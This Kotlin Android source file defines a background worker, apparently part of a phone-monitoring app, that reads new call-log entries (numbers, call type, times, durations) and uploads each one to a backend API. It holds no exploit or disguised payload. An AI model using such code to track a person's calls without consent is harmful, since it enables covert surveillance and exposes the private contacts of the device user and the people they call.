package com.example.location_where.workers

import android.content.Context
import android.provider.CallLog
import android.util.Log
import androidx.hilt.work.HiltWorker
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.example.location_where.api.ApiService
import com.example.location_where.api.CallLogRequest
import dagger.assisted.Assisted
import dagger.assisted.AssistedInject
import java.text.SimpleDateFormat
import java.util.*

@HiltWorker
class CallLogWorker @AssistedInject constructor(
    @Assisted context: Context,
    @Assisted params: WorkerParameters,
    private val apiService: ApiService
) : CoroutineWorker(context, params) {

    override suspend fun doWork(): Result {
        val sharedPrefs = applicationContext.getSharedPreferences("MonitoringPrefs", Context.MODE_PRIVATE)
        val lastSyncTimestamp = sharedPrefs.getLong("last_call_sync", 0L)
        
        val newCalls = try {
            getNewCalls(lastSyncTimestamp)
        } catch (e: SecurityException) {
            Log.e("CallLogWorker", "Permission denied for call log", e)
            return Result.failure()
        } catch (e: Exception) {
            Log.e("CallLogWorker", "Failed to get call logs", e)
            return Result.failure()
        }
        
        var allSuccess = true
        var latestTimestamp = lastSyncTimestamp

        for (call in newCalls) {
            try {
                val response = apiService.uploadCallLog(call)
                if (response.isSuccessful) {
                    val callTime = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                        .parse(call.startedAt)?.time ?: 0L
                    if (callTime > latestTimestamp) latestTimestamp = callTime
                } else {
                    allSuccess = false
                }
            } catch (e: Exception) {
                allSuccess = false
            }
        }

        if (latestTimestamp > lastSyncTimestamp) {
            sharedPrefs.edit().putLong("last_call_sync", latestTimestamp).apply()
        }

        return if (allSuccess) Result.success() else Result.retry()
    }

    private fun getNewCalls(since: Long): List<CallLogRequest> {
        val calls = mutableListOf<CallLogRequest>()
        val cursor = applicationContext.contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            null,
            "${CallLog.Calls.DATE} > ?",
            arrayOf(since.toString()),
            "${CallLog.Calls.DATE} ASC"
        )

        cursor?.use {
            val numberIdx = it.getColumnIndex(CallLog.Calls.NUMBER)
            val typeIdx = it.getColumnIndex(CallLog.Calls.TYPE)
            val dateIdx = it.getColumnIndex(CallLog.Calls.DATE)
            val durationIdx = it.getColumnIndex(CallLog.Calls.DURATION)

            while (it.moveToNext()) {
                val number = it.getString(numberIdx)
                val type = when (it.getInt(typeIdx)) {
                    CallLog.Calls.INCOMING_TYPE -> "INCOMING"
                    CallLog.Calls.OUTGOING_TYPE -> "OUTGOING"
                    CallLog.Calls.MISSED_TYPE -> "MISSED"
                    else -> "UNKNOWN"
                }
                val date = it.getLong(dateIdx)
                val duration = it.getInt(durationIdx)
                
                val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                val startDate = sdf.format(Date(date))
                val endDate = sdf.format(Date(date + duration * 1000L))

                calls.add(CallLogRequest(type, number, duration, startDate, endDate))
            }
        }
        return calls
    }
}
